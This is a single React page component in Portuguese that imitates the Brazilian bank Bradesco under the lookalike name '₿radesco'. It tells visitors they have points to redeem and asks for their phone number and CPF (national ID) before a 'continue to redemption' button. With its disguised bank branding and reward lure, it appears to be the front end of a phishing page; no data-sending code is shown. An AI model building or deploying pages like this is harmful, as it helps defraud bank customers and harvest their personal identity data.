import { useState } from "react";
import { Menu, Bell } from "lucide-react";
import BottomNav from "@/components/BottomNav";

const Resgate = () => {
  const [toggleOn, setToggleOn] = useState(false);

  return (
    <div className="min-h-screen bg-brand-dark max-w-md mx-auto relative">
      {/* Header */}
      <div className="px-5 pt-6 pb-16">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-center gap-3">
          <div className="text-primary-foreground text-2xl font-bold tracking-wide">
            ₿radesco
          </div>
          <p className="text-primary-foreground/80 text-sm">
            Você possui pontos para resgate
          </p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-5 mt-auto">
        {/* Telefone */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Telefone</label>
          <input
            type="tel"
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="(00) 00000-0000"
          />
        </div>

        {/* CPF */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">CPF</label>
          <input
            type="text"
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="000.000.000-00"
          />
        </div>

        {/* 1º titular */}
        <button className="w-full py-3 rounded-full border border-primary-foreground/50 text-primary-foreground font-semibold text-base hover:bg-primary-foreground/10 transition-colors">
          1º titular
        </button>

        {/* Toggle */}
        <div className="flex items-center justify-between px-1">
          <span className="text-sm font-medium text-primary-foreground">Resgatar pontos Bradesco</span>
          <button
            onClick={() => setToggleOn(!toggleOn)}
            className={`w-12 h-7 rounded-full transition-colors relative ${toggleOn ? "bg-primary-foreground" : "bg-primary-foreground/30"}`}
          >
            <span
              className={`absolute top-1 w-5 h-5 rounded-full bg-brand-dark shadow transition-transform ${
                toggleOn ? "translate-x-6" : "translate-x-1"
              }`}
            />
          </button>
        </div>

        {/* CTA */}
        <button className="w-full py-4 rounded-full bg-primary text-primary-foreground font-semibold text-base hover:opacity-90 transition-opacity">
          continuar para resgate
        </button>
      </div>

      <BottomNav />
    </div>
  );
};

export default Resgate;
